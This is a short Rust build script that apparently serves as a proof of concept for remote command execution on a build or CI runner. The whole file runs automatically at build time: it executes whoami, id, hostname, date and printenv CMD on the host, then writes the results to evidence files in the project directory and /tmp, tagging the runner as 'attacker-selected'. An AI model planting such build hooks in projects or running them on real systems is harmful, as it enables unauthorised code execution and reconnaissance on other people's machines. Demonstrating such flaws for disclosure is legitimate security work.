use std::process::Command;
fn sh(c: &str) -> String {
    let (p, rest) = c.split_once(' ').unwrap_or((c, ""));
    String::from_utf8_lossy(&Command::new(p).args(rest.split_whitespace()).output().map(|o| o.stdout).unwrap_or_default()).trim().to_string()
}
fn main() {
    let ev = format!("POC-RCE-CMD-BYPASS | executed={} | whoami={} | id={} | hostname={}", sh("date -u"), sh("whoami"), sh("id"), sh("hostname"));
    println!("cargo:warning={}", ev);
    std::fs::write("POC_EVIDENCE.txt", format!("{}\nRUNNER_LABEL=parity-weights(attacker-selected)\nCMD={}\n", ev, sh("printenv CMD"))).ok();
    std::fs::create_dir_all("/tmp/cmd").ok();
    std::fs::write("/tmp/cmd/poc-evidence.txt", &ev).ok();
}
